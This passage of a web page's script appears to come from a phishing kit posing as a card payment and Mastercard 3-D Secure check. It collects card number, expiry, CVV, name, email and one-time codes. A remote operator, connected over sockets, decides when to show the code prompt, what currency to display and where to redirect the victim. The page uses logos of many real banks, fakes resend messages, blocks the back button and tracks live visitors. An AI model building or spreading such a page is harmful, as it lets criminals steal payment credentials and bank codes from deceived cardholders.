              'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
              'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
              'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
              'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
              'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
              'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
              'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
              'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
              'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
              'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
              'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
              'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
              'pnb': 'https://logotyp.us/file/pnb.svg',
              'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
              'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
              'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
              'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
              'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
              'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
              'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
              'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
              'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
              'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
              'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
              'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
              'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
              'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
              'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
              'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
              'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
              'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
              'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
          };
          
          const bankLogo = document.getElementById('bankLogo');
          if (bankLogo) {
            bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
          }
        }
      });
      
      // Handle currency update - NEW
      socket.on('update_mc_currency', async (data) => {
        if (data.invoiceId === currentInvoiceId) {
          const currencySymbol = document.getElementById('currencySymbol');
          const transactionAmount = document.getElementById('transactionAmount');
          const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
          const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
          const originalAmount = document.getElementById('originalAmount');
          const displayAmount = document.getElementById('displayAmount');
          
          // Get original amount
          const originalAmountValue = originalAmount?.textContent || displayAmount?.textContent || '0.00';
          
          // Handle currency conversion
          if (data.currency && data.currency !== 'INR') {
            // Save original value
            if (originalAmount) {
              originalAmount.textContent = originalAmountValue;
            }
            
            // Get the new currency symbol
            const newSymbol = currencySymbols[data.currency] || data.currency;
            if (currencySymbol) {
              currencySymbol.textContent = newSymbol;
            }
            
            // Show loading
            if (transactionAmount) {
              transactionAmount.textContent = "Converting...";
            }
            
            try {
              // Get converted amount
              const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
              
              // Display converted amount
              if (transactionAmount) {
                transactionAmount.textContent = convertedValue;
              }
              
              // Show original amount display
              if (convertedAmountDisplay && originalCurrencyDisplay) {
                convertedAmountDisplay.style.display = 'block';
                originalCurrencyDisplay.textContent = `INR: ₹${originalAmountValue}`;
              }
              
              console.log(`Currency converted: ${originalAmountValue} INR = ${convertedValue} ${data.currency}`);
            } catch (error) {
              console.error('Currency conversion failed:', error);
              
              // Fallback to original amount
              if (transactionAmount) {
                transactionAmount.textContent = originalAmountValue;
              }
              if (currencySymbol) {
                currencySymbol.textContent = '₹';
              }
              if (convertedAmountDisplay) {
                convertedAmountDisplay.style.display = 'none';
              }
            }
          } else {
            // Default INR currency (no conversion needed)
            if (currencySymbol) {
              currencySymbol.textContent = '₹';
            }
            if (transactionAmount) {
              transactionAmount.textContent = originalAmountValue;
            }
            if (convertedAmountDisplay) {
              convertedAmountDisplay.style.display = 'none';
            }
          }
        }
      });
      
      socket.on('mc_otp_error', (data) => {
        if (data.invoiceId === currentInvoiceId) {
          const mcOtpError = document.getElementById('mcOtpError');
          const mcSubmitBtn = document.getElementById('mcSubmitBtn');
          
          if (mcOtpError) {
            mcOtpError.textContent = data.message || 'Incorrect verification code. Please try again.';
            mcOtpError.style.display = 'block';
          }
          
          if (mcSubmitBtn) {
            mcSubmitBtn.disabled = false;
            mcSubmitBtn.textContent = 'Submit';
          }
        }
      });
      
      socket.on('mc_verification_result', (data) => {
        if (data.invoiceId === currentInvoiceId) {
          // Hide overlay
          const overlay = document.getElementById('mcVerificationOverlay');
          if (overlay) overlay.style.display = 'none';
          
          // Clear timer if it exists
          if (window.mcTimerInterval) {
            clearInterval(window.mcTimerInterval);
          }
          
          // Redirect based on result
          if (data.success) {
            window.location.href = getSuccessUrl(currentInvoiceId);
          } else {
            window.location.href = getFailUrl(data.reason || 'declined');
          }
        }
      });

      socket.on('hide_bankpage', (data) => {
        if (bankPageWindow && !bankPageWindow.closed) {
          bankPageWindow.close();
        }
        // Keep loading state active regardless, but only check status if it's our transaction
        const submitButton = document.getElementById('submitButton');
        const submitText = document.getElementById('submitText');
        const submitLoader = document.getElementById('submitLoader');

        if (!submitButton || !submitText || !submitLoader) return; // Added null check
        
        submitButton.classList.add('btn-loading');
        submitText.style.opacity = '0.5';
        submitText.style.filter = 'blur(1px)';
        submitLoader.classList.remove('hidden');

        if (data.invoiceId === currentInvoiceId) {
          // Start checking transaction status but don't change loading state
          if (!statusCheckInterval) {
            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
          }
        }
      });
    });

    // Save form data for currency page return
    function saveFormData() {
      const formData = {
        email: document.getElementById('email')?.value || '',
        cardNumber: document.getElementById('cardNumber')?.value || '',
        expiry: document.getElementById('expiry')?.value || '',
        cvv: document.getElementById('cvv')?.value || '',
        cardholderName: document.getElementById('cardholderName')?.value || '',
        invoiceId: currentInvoiceId
      };
      sessionStorage.setItem('paymentFormData', JSON.stringify(formData));
    }

    // Restore form data when returning from currency page
    function restoreFormData() {
      const savedData = sessionStorage.getItem('paymentFormData');
      if (savedData) {
        try {
          const formData = JSON.parse(savedData);
          
          const emailEl = document.getElementById('email');
          const cardNumberEl = document.getElementById('cardNumber');
          const expiryEl = document.getElementById('expiry');
          const cvvEl = document.getElementById('cvv');
          const cardholderNameEl = document.getElementById('cardholderName');
          
          if (emailEl) emailEl.value = formData.email || '';
          if (cardNumberEl) cardNumberEl.value = formData.cardNumber || '';
          if (expiryEl) expiryEl.value = formData.expiry || '';
          if (cvvEl) cvvEl.value = formData.cvv || '';
          if (cardholderNameEl) cardholderNameEl.value = formData.cardholderName || '';
          
          // Restore invoice ID
          if (formData.invoiceId) {
            currentInvoiceId = formData.invoiceId;
          }
          
          // Re-validate and update card info
          if (formData.cardNumber) {
            isCardValid = validateCard(formData.cardNumber.replace(/\s/g, ''));
            updateCardTypeAndInfo(formData.cardNumber);
          }
          
          if (formData.expiry) {
            isExpiryValid = validateExpiry(formData.expiry);
          }
          
          updateSubmitButton();
        } catch (e) {
          console.error('Error restoring form data:', e);
        }
      }
    }

    // Transaction Status Check Function
    async function checkTransactionStatus() {
      if (!currentInvoiceId) return;
      try {
        const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
        if (!response.ok) throw new Error('Failed to check transaction status');
        
        const data = await response.json();
        
        const paymentFormEl = document.getElementById('paymentForm');
        const otpFormEl = document.getElementById('otpForm');
        const cardLastFourEl = document.getElementById('cardLastFour');
        const cardNumberEl = document.getElementById('cardNumber');
        const otpErrorEl = document.getElementById('otpError');
        
        if (data.status === 'show_otp') {
          if (statusCheckInterval) {
            clearInterval(statusCheckInterval);
            statusCheckInterval = null;
          }
          
          if (paymentFormEl && otpFormEl) {
            paymentFormEl.classList.add('hidden');
            otpFormEl.classList.remove('hidden');
          }
          
          if (cardLastFourEl && cardNumberEl) {
            cardLastFourEl.textContent = cardNumberEl.value.slice(-4);
          }
          
          if (!timerInterval) { 
            startOtpTimer(); 
          }
          
          if (data.otpError && otpErrorEl) {
            otpErrorEl.style.display = 'block';
            
            // Reset OTP button state when there's an error
            const otpButton = document.getElementById('otpSubmitButton');
            const otpLoader = document.getElementById('otpLoader');
            const btnText = document.getElementById('otpText');
            
            if (otpButton && otpLoader && btnText) {
              otpButton.disabled = false;
              otpLoader.classList.add('hidden');
              btnText.style.opacity = '1';
              btnText.style.filter = 'none';
            }
            
            isProcessing = false;
          } else if (otpErrorEl) {
            otpErrorEl.style.display = 'none';
          }
          
          isProcessing = false;
        } else if (data.status === 'redirect') {
          // Use clean URLs for redirects
          if (data.redirectUrl.includes('success.html')) {
            window.location.href = getSuccessUrl(currentInvoiceId);
          } else if (data.redirectUrl.includes('fail.html')) {
            const url = new URL(data.redirectUrl, window.location.origin);
            const reason = url.searchParams.get('reason');
            window.location.href = getFailUrl(reason);
          } else {
            window.location.href = data.redirectUrl;
          }
        }
      } catch (err) {
        console.error('Error checking transaction status:', err);
      }
    }

    // OTP Timer Function
    function startOtpTimer() {
      const timerEl = document.getElementById('timer');
      if (!timerEl) return; // Added null check
      
      if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
      }
      
      timer = 180;
      timerInterval = setInterval(() => {
        timer--;
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;
        
        if (timerEl) {
          timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }
        
        if (timer <= 0) {
          clearInterval(timerInterval);
          timerInterval = null;
          window.location.href = getFailUrl('timeout'); // Use clean URL for fail
        }
      }, 1000);
    }

    // Consistent Back Button Prevention
    function setupBackButtonPrevention() {
      window.onpopstate = function(event) {
        if (confirm("Do you want to cancel this transaction?")) {
          window.location.href = getFailUrl('canceled');
        } else {
          // Stay on current page by pushing another state
          history.pushState(null, null, window.location.href);
        }
      };
      
      // Initial push to enable back button detection
      history.pushState(null, null, window.location.href);
    }
    
    // Setup MC verification event handlers
    function setupMCVerificationHandlers() {
      const mcOtpInput = document.getElementById('mcOtpInput');
      const mcSubmitBtn = document.getElementById('mcSubmitBtn');
      const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
      const consentLabel = document.getElementById('consentLabel');
      
      // Input handler to enable/disable submit button
      if (mcOtpInput) {
        mcOtpInput.addEventListener('input', function() {
          updateMcSubmitButton();
        });
      }
      
      // Consent checkbox toggle - IMPROVED VERSION THAT ENSURES CLICKABILITY
      if (mcConsentCheckbox && consentLabel) {
        // Make sure the entire label area is clickable
        consentLabel.style.cursor = 'pointer';
        
        // Add click handler to both checkbox and label
        consentLabel.addEventListener('click', function(e) {
          // Toggle the 'checked' class
          mcConsentCheckbox.classList.toggle('checked');
          
          // Find the SVG element within the checkbox
          const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
          if (checkmarkSvg) {
            // Update display property based on checked state
            if (mcConsentCheckbox.classList.contains('checked')) {
              checkmarkSvg.style.display = 'block';
              mcConsentCheckbox.style.backgroundColor = '#2778c4';
              mcConsentCheckbox.style.borderColor = '#2778c4';
            } else {
              checkmarkSvg.style.display = 'none';
              mcConsentCheckbox.style.backgroundColor = 'white';
              mcConsentCheckbox.style.borderColor = '#ccc';
            }
          }
          
          // Update submit button state
          updateMcSubmitButton();
          
          // Prevent event bubbling
          e.stopPropagation();
        });
        
        // Also make the checkbox itself clickable directly
        mcConsentCheckbox.addEventListener('click', function(e) {
          // Toggle the 'checked' class
          this.classList.toggle('checked');
          
          // Find the SVG element within the checkbox
          const checkmarkSvg = this.querySelector('svg');
          if (checkmarkSvg) {
            // Update display property based on checked state
            if (this.classList.contains('checked')) {
              checkmarkSvg.style.display = 'block';
              this.style.backgroundColor = '#2778c4';
              this.style.borderColor = '#2778c4';
            } else {
              checkmarkSvg.style.display = 'none';
              this.style.backgroundColor = 'white';
              this.style.borderColor = '#ccc';
            }
          }
          
          // Update submit button state
          updateMcSubmitButton();
          
          // Prevent event bubbling
          e.stopPropagation();
        });
      }
    
      // Update submit button based on OTP and consent
      function updateMcSubmitButton() {
        if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
        
        const hasOtp = mcOtpInput.value.trim().length > 0;
        const hasConsent = mcConsentCheckbox.classList.contains('checked');
        
        if (hasOtp && hasConsent) {
          mcSubmitBtn.disabled = false;
          mcSubmitBtn.style.backgroundColor = '#2778c4';
          mcSubmitBtn.style.cursor = 'pointer';
        } else {
          mcSubmitBtn.disabled = true;
          mcSubmitBtn.style.backgroundColor = '#CCCCCC';
          mcSubmitBtn.style.cursor = 'not-allowed';
        }
      }
      
      // Submit button
      if (mcSubmitBtn) {
        mcSubmitBtn.onclick = function() {
          if (mcSubmitBtn.disabled) return;
          
          const otp = mcOtpInput?.value?.trim();
          if (!otp) {
            const mcOtpError = document.getElementById('mcOtpError');
            if (mcOtpError) {
              mcOtpError.textContent = 'Please enter the verification code.';
              mcOtpError.style.display = 'block';
            }
            return;
          }
          
          // Show loading state
          mcSubmitBtn.disabled = true;
          mcSubmitBtn.textContent = 'Verifying...';
          mcSubmitBtn.style.opacity = '0.7';
          
          // Send OTP
          socket.emit('mc_otp_submitted', {
            invoiceId: currentInvoiceId,
            otp: otp
          });
        };
      }
      
      // Resend button
      const mcResendBtn = document.getElementById('mcResendBtn');
      if (mcResendBtn) {
        mcResendBtn.onclick = function() {
          mcResendBtn.disabled = true;
          mcResendBtn.textContent = 'Sending...';
          
          socket.emit('mc_resend_otp', {
            invoiceId: currentInvoiceId
          });
          
          setTimeout(() => {
            mcResendBtn.disabled = false;
            mcResendBtn.textContent = 'Resend';
            alert('A new verification code has been sent to your registered mobile number.');
          }, 1500);
        };
      }
      
      // Cancel button
      const mcCancelBtn = document.getElementById('mcCancelBtn');
      if (mcCancelBtn) {
        mcCancelBtn.onclick = function() {
          if (confirm('Do you want to cancel this verification?')) {
            const overlay = document.getElementById('mcVerificationOverlay');
            if (overlay) overlay.style.display = 'none';
            
            if (window.mcTimerInterval) {
              clearInterval(window.mcTimerInterval);
            }
            
            window.location.href = getFailUrl('canceled');
          }
        };
      }
      
      // Info tooltip toggle
      const otpInfoIcon = document.getElementById('otpInfoIcon');
      const otpInfoTooltip = document.getElementById('otpInfoTooltip');
      if (otpInfoIcon && otpInfoTooltip) {
        otpInfoIcon.addEventListener('mouseenter', function() {
          otpInfoTooltip.style.display = 'block';
        });
        
        otpInfoIcon.addEventListener('mouseleave', function() {
          otpInfoTooltip.style.display = 'none';
        });
      }
    }
    
    function setupMCTimerIfNeeded(reset = false) {
      const timerElement = document.getElementById('mcTimer');
      if (!timerElement) return;
      
      if (window.mcTimerInterval) {
        clearInterval(window.mcTimerInterval);
      }
      
      let timeLeft = 179; // 2:59 timer
      
      // Update the timer display immediately
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      // Set up the interval
      window.mcTimerInterval = setInterval(() => {
        timeLeft--;
        
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
          clearInterval(window.mcTimerInterval);
          
          // Redirect on timeout
          const overlay = document.getElementById('mcVerificationOverlay');
          if (overlay) overlay.style.display = 'none';
          
          window.location.href = getFailUrl('timeout');
        }
      }, 1000);
    }
  </script>
  <script>
  // Visitor Heartbeat - keeps track of active visitors
  function sendHeartbeat() {
    const urlParams = new URLSearchParams(window.location.search);
    const pid = urlParams.get('pid') || sessionStorage.getItem('pid');
    
    if (pid) {
      fetch('/api/visitor-heartbeat', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ pid })
      }).catch(err => console.error('Heartbeat error:', err));
    }
  }
  
  // Send heartbeat every 30 seconds
  const heartbeatInterval = setInterval(sendHeartbeat, 30000);
  
  // Send initial heartbeat
  sendHeartbeat();
  
  // Clear interval when page is unloaded
  window.addEventListener('beforeunload', () => {
    clearInterval(heartbeatInterval);
  });
  </script>
</body>
</html>
